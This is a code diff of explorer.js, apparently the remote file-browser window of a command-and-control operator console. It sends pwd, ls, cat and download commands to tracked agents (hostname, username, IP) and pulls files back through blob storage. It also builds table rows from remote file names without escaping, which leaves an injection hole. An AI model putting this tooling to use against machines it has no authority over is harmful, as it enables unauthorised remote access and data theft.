@@ -12,6 +12,7 @@ let init_cwd = 0;
 let pwd = '';
 let mode = '';
 let currentFile = '';
+global.agent = null;
 
 
 function splitStringWithQuotes(str) {
@@ -81,57 +82,48 @@ function doDownloadFile(argv)
   return download;
 }
 
+class Task {
+    constructor(command) {
+        this.outputChannel = 'o-' + Math.random().toString(36).substring(2, 14);
+        this.command = command;
+    }
+}
+
 function sendCommand(command) {
     let argv = splitStringWithQuotes(command);
-    log(`argv : ${argv}`);
-    log(`explorer.js : sendCommand : ${command}`);
-    log(`containerBlob : ${containerBlob}`);
-    log(`containerKey  : ${containerKey}`);
-    log(`containerName : ${containerName}`);
-
-    let containerCmd = JSON.parse(`{"blobs":${containerBlob}}`);
-    containerCmd.key = JSON.parse(containerKey);
-    containerCmd.name = containerName;
-    containerCmd.cmd = command;
-    log(`containerCmd : \r\n${JSON.stringify(containerCmd)}`);
-
+    log(`[EXPLORER][SENDCMD] command : ${command}`);
+    log(`[EXPLORER][SENDCMD] argv : ${argv}`);
     let download;
-    let download_command;
+    const task = new Task(
+        command
+    );
+    if (!Array.isArray(global.agent.tasks)) {
+        global.agent.tasks = [];
+    }
+    global.agent.tasks.push(task);
+    log(`[EXPLORER][SENDCMD] task : ${JSON.stringify(global.agent.tasks[global.agent.tasks.length - 1])}`);
 
-    log(`argv[0] : ${argv[0]}`);
     if (argv[0] == "download")
     {
-        log(`hit download`);
         let currentPath = document.getElementById("dirPath").value.trim();
         const concatenated = argv.slice(1).join(" ");
         argv[1] = currentPath.endsWith("/") ? currentPath + concatenated : currentPath + "/" + concatenated;
-        log(`argv : ${argv}`);
         download = doDownloadFile(argv);
-        log(`[+] SendCommand.explorer.js : JSON.stringify(download) \r\n: ${JSON.stringify(download)}`);
-        download_command = `download ${download['file']} ${download['blob']}`;
-        log(`[+] SendCommand.explorer.js : command : ${download_command}`);
-        containerCmd.cmd = download_command;
-        log("pulling download file");
-        log(`download['file'] : ${download['file']}`);
-        log(`download['blob'] : ${download['blob']}`);
-        log(`containerCmd : \r\n${JSON.stringify(containerCmd)}`);
-        ipcRenderer.send('pull-download-file', JSON.stringify(containerCmd),download['file'],download['blob']);  // Send command and container name
-        log(`[+] SendCommand.explorer.js : JSON.stringify(containerCmd) \r\n: ${JSON.stringify(containerCmd)}`);
-        ipcRenderer.send('upload-client-command-to-input-channel', JSON.stringify(containerCmd));  // Send command and container name
+        global.agent.tasks[global.agent.tasks.length - 1].command = `download ${download['file']} ${download['blob']}`;
+        ipcRenderer.send('pull-download-file', global.agent,download['file'],download['blob']);  // Send command and container name
+        ipcRenderer.send('upload-client-command-to-input-channel', global.agent);  // Send command and container name
 // 
     }
     else{
-        log(`hit all else handler`);
-        ipcRenderer.send('upload-client-command-to-input-channel', JSON.stringify(containerCmd));  // Send command and container name
+        log(`[EXPLORER][SENDCMD] hit all else handler`);
+        ipcRenderer.send('upload-client-command-to-input-channel', global.agent);  // Send command and container name
     }
 }
 
 async function initialize() {
-    log(`Initialize explorer.js`);
-
+    log(`explorer.js : initialize `);
     mode = "pwd";
-    sendCommand("pwd");
-    // listFiles();
+    await sendCommand("pwd");
 }
 
 async function listFiles() {
@@ -139,42 +131,78 @@ async function listFiles() {
     sendCommand(`ls ${"'"+document.getElementById("dirPath").value.trim()+"'"}`);
 }
 
+async function format_ls_output(filesAndFolders) {
+    let resultBuffer = '';
+    resultBuffer += `Name`.padEnd(60) + `Type`.padEnd(16) + `Size (bytes)`.padEnd(15) + `Created`.padEnd(24) + `Modified`.padEnd(24) + '\n';
+    resultBuffer += '-'.repeat(30) + '-'.repeat(10) + '-'.repeat(15) + '-'.repeat(30) + '-'.repeat(30) + '\n';
+    log(`[AGENT][IPC] format_ls_output : ${filesAndFolders}`);
+    let entries = JSON.parse(filesAndFolders)
+
+    for (const entry of entries) {
+        try {
+            log(`[AGENT][IPC] entry : ${entry}`);
+            const options = { 
+                month: '2-digit', 
+                day: '2-digit', 
+                year: '2-digit', 
+                hour: '2-digit', 
+                minute: '2-digit', 
+                second: '2-digit', 
+                hour12: false 
+            };
+            resultBuffer += (entry.name || '').padEnd(60);
+            resultBuffer += (entry.type || '').padEnd(16);
+            resultBuffer += (entry.stats.size ? String(entry.stats.size) : '').padEnd(15);
+            resultBuffer += (entry.stats.ctimeMs ? new Date(entry.stats.ctimeMs).toLocaleString('en-US', options).replace(',', '') : '').padEnd(24);
+            resultBuffer += (entry.stats.mtimeMs ? new Date(entry.stats.mtimeMs).toLocaleString('en-US', options).replace(',', '') : '').padEnd(24);
+            resultBuffer += '\n';
+        } catch (err) {
+            log(`Error: ${err.message}`);
+        }
+    }
+    return resultBuffer;
+}
+
 async function listFiles_display(lsCommandOutput) 
 {
-    // Split output into lines and remove headers
-    let lines = lsCommandOutput.split("\n").slice(2); // Skip headers and separator line
+    try {
+        // Parse the JSON string into an array of file entries
+        let files = JSON.parse(lsCommandOutput);
 
-    let files = lines.map(line => {
-        let parts = line.match(/(.{1,60})\s+(File|Directory)\s+(\d+|-)\s+(\d{2}\/\d{2}\/\d{2} \d{2}:\d{2}:\d{2})\s+(\d{2}\/\d{2}\/\d{2} \d{2}:\d{2}:\d{2})/);
+        // Insert into table
+        const fileList = document.getElementById("fileList");
+        fileList.innerHTML = "";
 
-        if (!parts) return null; // Skip invalid lines
+        files.forEach(file => {
+            const row = document.createElement("tr");
+            const type = file.type === "Directory" ? "Folder" : "File";
+            const size = file.stats.size || '-';
+            
+            const options = { 
+                month: '2-digit', 
+                day: '2-digit', 
+                year: '2-digit', 
+                hour: '2-digit', 
+                minute: '2-digit', 
+                second: '2-digit', 
+                hour12: false 
+            };
+            const modified = file.stats.mtimeMs ? new Date(file.stats.mtimeMs).toLocaleString('en-US', options).replace(',', '') : '';
 
-        return {
-            name: parts[1].trim(),
-            type: parts[2] === "Directory" ? "Folder" : "File", // Convert "Directory" to "Folder"
-            size: parts[3] === '-' ? '-' : parseInt(parts[3]),
-            created: parts[4],
-            modified: parts[5]
-        };
-    }).filter(item => item !== null); // Remove null entries
-
-    // Insert into table
-    const fileList = document.getElementById("fileList");
-    fileList.innerHTML = "";
-
-    files.forEach(file => {
-        const row = document.createElement("tr");
-        row.innerHTML = `
-            <td class="${file.type === 'Folder' ? 'folder' : 'file'}" 
-                onclick="${file.type === 'Folder' ? `navigateTo('${file.name}')` : `openFile('${file.name}')`}">
-                ${file.name}
-            </td>
-            <td>${file.size}</td>
-            <td>${file.type}</td>
-            <td>${file.modified}</td>
-        `;
-        fileList.appendChild(row);
-    });
+            row.innerHTML = `
+                <td class="${type.toLowerCase()}" 
+                    onclick="${type === 'Folder' ? `navigateTo('${file.name}')` : `openFile('${file.name}')`}">
+                    ${file.name}
+                </td>
+                <td>${size}</td>
+                <td>${type}</td>
+                <td>${modified}</td>
+            `;
+            fileList.appendChild(row);
+        });
+    } catch (err) {
+        log(`Error in listFiles_display: ${err.message}`);
+    }
 }
 
 async function navigateTo(folderName) {
@@ -269,38 +297,42 @@ document.getElementById("dirPath").addEventListener("keypress", function(event) 
 ipcRenderer.on('command-output', (event, output) => {
     try {
         if (output) {
-            if(output === "pushedfile" || !output.substring(0, 3).includes('/')){
-                const dirPath = document.getElementById('dirPath');
-                if (!dirPath.value)
-                {
-                    initialize();
-                    return;
-                }else{
-                   // listFiles();
-                }
-
-            }
-            if (mode === "pwd") {
+            // Convert output to string if it's an object
+            log(`[EXPLORER][IPC][COMMANDOUT]: output : ${JSON.stringify(output)}`);
+            
+            // if(output.output === "pushedfile" || !output.output.substring(0, 3).includes('/')){
+            //     const dirPath = document.getElementById('dirPath');
+            //     if (!dirPath.value)
+            //     {
+            //         initialize();
+            //         return;
+            //     }else{
+            //        // listFiles();
+            //     }
+            // }
+            if (output.command === "pwd") {
                 mode = "";
-                if (!output.endsWith("/")) {
-                    output += "/";
+                output.output = output.output.trim();
+                output.output = output.output.replace(/\\/g, '/');
+                if (!output.output.endsWith("/")) {
+                    output.output += "/";
                 }
-                document.getElementById("dirPath").value = output;
-                //document.getElementById("dirPath").value = "C:/";
-                pwd = output;
+                document.getElementById("dirPath").value = output.output;
+                log(`[EXPLORER][IPC][CMDOUT] output.output : ${output.output}`);
+                pwd = output.output;
                 listFiles();
             } 
             else if (mode === "list") {
                 mode = "";
-                listFiles_display(output);
+                listFiles_display(output.output);
             } 
             else if (mode === "cat") {
                 mode = "";
-                openTextFileInNewWindow(output);
+                openTextFileInNewWindow(output.output);
             }
         }
     } catch (error) {
-        log(`Error in explorer.js:command-output: ${error.message}\r\n${error.stack}`);
+        log(`[EXPLORER][IPC][CMDOUT] error : ${error.message}\r\n${error.stack}`);
     }
 });
 
@@ -376,17 +408,12 @@ function openTextFileInNewWindow(content) {
 
 window.addEventListener('DOMContentLoaded', async () => 
     {
-      ipcRenderer.on('container-data', (event, name, aes, blobs, agentJson) => 
+      ipcRenderer.on('container-data', (event, agent_object) => 
       {
-        log(`explorer.js : container-data : ${name}`);
+        log(`explorer.js : container-data : ${agent_object.agentid}`);
         try{
-          containerName = name;
-          containerKey = JSON.stringify(aes);
-          containerBlob = JSON.stringify(blobs);
-          agent = JSON.parse(agentJson);
-          agentObj = agent;
-     
-          document.title = `${agent.agentid.toUpperCase()} | ${agent.hostname.toUpperCase()} | ${agent.username.toUpperCase()} | ${agent.IP}`;
+          global.agent = agent_object;
+          document.title = `${agent_object.agentid.toUpperCase()} | ${agent_object.hostname.toUpperCase()} | ${agent_object.username.toUpperCase()} | ${agent_object.IP}`;
     
           const dirPath = document.getElementById('dirPath');
           dirPath.focus();
@@ -397,9 +424,9 @@ window.addEventListener('DOMContentLoaded', async () =>
         }
     });
     const checkVariables = setInterval(() => {
-        if (containerName && containerKey && containerBlob && agentObj && agent) {
+        if (global.agent) {
+            log(`explorer.js : container-data : ${global.agent}`);
             clearInterval(checkVariables); // Stop the loop when all variables have values
-            log("All variables have been assigned!");
             initialize();
         }
     }, 100); // Check every 100ms
